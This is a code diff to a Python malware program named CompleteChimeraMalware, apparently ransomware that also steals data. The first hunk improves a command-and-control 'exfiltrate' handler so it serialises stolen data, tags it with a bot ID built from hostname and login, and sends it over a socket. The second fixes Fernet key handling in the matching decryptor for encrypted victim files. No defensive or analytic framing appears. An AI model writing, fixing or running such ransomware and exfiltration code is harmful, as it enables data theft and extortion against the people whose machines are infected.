@@ -1708,14 +1708,17 @@ class CompleteChimeraMalware:
                         # Send exfiltrated data if available
                         if command == "exfiltrate":
                             stolen_data = self.collect_exfiltration_data()
+                            # Convert stolen_data dict to JSON string for transmission
                             exfil_message = {
                                 "type": "exfiltration",
-                                "data": stolen_data,
+                                "data": json.dumps(stolen_data, indent=2, ensure_ascii=False),
                                 "file_count": self.encrypted_count,
-                                "stolen_samples": self.stolen_data_count
+                                "stolen_samples": self.stolen_data_count,
+                                "bot_id": f"{socket.gethostname()}_{os.getlogin()}"
                             }
                             try:
                                 s.send(json.dumps(exfil_message).encode())
+                                print(f"    [+] Exfiltrated {self.stolen_data_count} samples to C2")
                             except (BrokenPipeError, ConnectionResetError):
                                 print("    [!] Failed to send exfiltration data")
                                 break
@@ -2182,35 +2185,27 @@ if __name__ == "__main__":
             print(f"[*] Attempting decryption with key: {key_str}")
             
             try:
-                # CRITICAL FIX: Handle both URL-safe and standard base64 formats
-                # Convert URL-safe base64 to standard base64
-                # Replace - with + and _ with /
+                # CRITICAL FIX: Fernet keys are ALREADY base64-encoded
+                # The key from Fernet.generate_key() is in base64 format
+                # We should NOT decode it - pass it directly as bytes
                 import base64
                 
-                # Try URL-safe base64 first (common in modern systems)
-                try:
-                    # Add padding if needed
-                    key_str_padded = key_str
-                    padding_needed = len(key_str) % 4
-                    if padding_needed:
-                        key_str_padded += '=' * (4 - padding_needed)
-                    
-                    # Decode URL-safe base64
-                    key_bytes = base64.urlsafe_b64decode(key_str_padded)
-                    print(f"[*] Decoded URL-safe base64 key ({len(key_bytes)} bytes)")
-                except:
-                    # Fallback to standard base64
-                    try:
-                        key_bytes = base64.b64decode(key_str)
-                        print(f"[*] Decoded standard base64 key ({len(key_bytes)} bytes)")
-                    except:
-                        # Last resort: use as-is (encoded string)
-                        key_bytes = key_str.encode()
-                        print(f"[*] Using key as UTF-8 encoded string")
+                # Add padding if needed (base64 requires length % 4 == 0)
+                key_str_padded = key_str
+                padding_needed = len(key_str) % 4
+                if padding_needed:
+                    key_str_padded += '=' * (4 - padding_needed)
                 
-                # Fernet expects the key to be exactly 32 bytes when base64 decoded
-                if len(key_bytes) != 32:
-                    print(f"[!] WARNING: Key is {len(key_bytes)} bytes, expected 32 bytes")
+                # Convert string to bytes (Fernet expects bytes, not string)
+                # But keep it in base64 format - do NOT decode it
+                key_bytes = key_str_padded.encode('utf-8')
+                
+                print(f"[*] Using Fernet key in base64 format ({len(key_bytes)} chars)")
+                
+                # Validate that this looks like a proper base64 Fernet key
+                # Should be 44 characters (32 bytes base64-encoded = 44 chars with padding)
+                if len(key_bytes) != 44:
+                    print(f"[!] WARNING: Key is {len(key_bytes)} characters, expected 44")
                     print(f"[!] This key may not work. Check if you copied the complete key.")
                 
                 decryptor = ChimeraDecryptor(key_bytes)
